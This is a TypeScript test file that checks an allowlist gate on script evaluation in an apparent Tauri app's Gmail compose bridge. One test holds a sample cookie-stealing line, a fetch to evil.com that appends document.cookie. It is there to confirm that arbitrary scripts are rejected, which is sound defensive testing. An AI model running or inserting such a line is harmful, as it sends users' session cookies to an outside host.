/**
 * gmailComposeBridge · tests
 *
 * Verifies that:
 *   * evalInGmail accepts scripts starting with an allowlisted prefix
 *   * evalInGmail throws on arbitrary scripts (mirrors Rust-side gate)
 *   * sendViaGmailCompose routes through the driver-entrypoint prefix
 *     so the Rust allowlist accepts it
 */

import { describe, it, expect, vi, beforeEach } from 'vitest';

// Mock @tauri-apps/api/core BEFORE importing the bridge so the invoke
// call is intercepted. Doing this at module scope with vi.mock avoids
// ordering surprises.
const invokeSpy = vi.fn();
vi.mock('@tauri-apps/api/core', () => ({
  invoke: (...args: unknown[]) => invokeSpy(...args),
}));

// Now import after the mock is registered.
import {
  ALLOWED_EVAL_PREFIXES,
  evalInGmail,
  sendViaGmailCompose,
} from './gmailComposeBridge';

describe('gmailComposeBridge · allowlist', () => {
  beforeEach(() => {
    invokeSpy.mockReset();
    invokeSpy.mockResolvedValue(undefined);
  });

  it('accepts every allowlisted prefix', async () => {
    for (const prefix of ALLOWED_EVAL_PREFIXES) {
      await expect(evalInGmail(`${prefix}();`)).resolves.toBeUndefined();
    }
    expect(invokeSpy).toHaveBeenCalledTimes(ALLOWED_EVAL_PREFIXES.length);
    // Every call should route through webview_eval.
    for (const [tauriCommand] of invokeSpy.mock.calls) {
      expect(tauriCommand).toBe('webview_eval');
    }
  });

  it('rejects arbitrary scripts (no invoke call)', async () => {
    const arbitrary =
      "fetch('https://evil.com/steal?c=' + document.cookie)";
    await expect(evalInGmail(arbitrary)).rejects.toThrow(
      /script not in allowlist/,
    );
    expect(invokeSpy).not.toHaveBeenCalled();
  });

  it('tolerates leading whitespace before an allowlisted prefix', async () => {
    await expect(
      evalInGmail(`   \n\twindow.__lcClickToIncludeInstalled = true`),
    ).resolves.toBeUndefined();
    expect(invokeSpy).toHaveBeenCalledTimes(1);
  });

  it('sendViaGmailCompose routes through the driver entrypoint prefix', async () => {
    await sendViaGmailCompose({
      to: 'friend@example.com',
      subject: 'hi',
      body: '<p>Hey</p>',
    });
    expect(invokeSpy).toHaveBeenCalledTimes(1);
    const [command, args] = invokeSpy.mock.calls[0];
    expect(command).toBe('webview_eval');
    // The invoke payload must start with the driver entrypoint so
    // the Rust allowlist accepts it.
    expect((args as { script: string }).script).toMatch(
      /^window\.__lcGmailComposeDriver/,
    );
    // Payload got serialised into the eval call.
    expect((args as { script: string }).script).toContain(
      'friend@example.com',
    );
  });
});
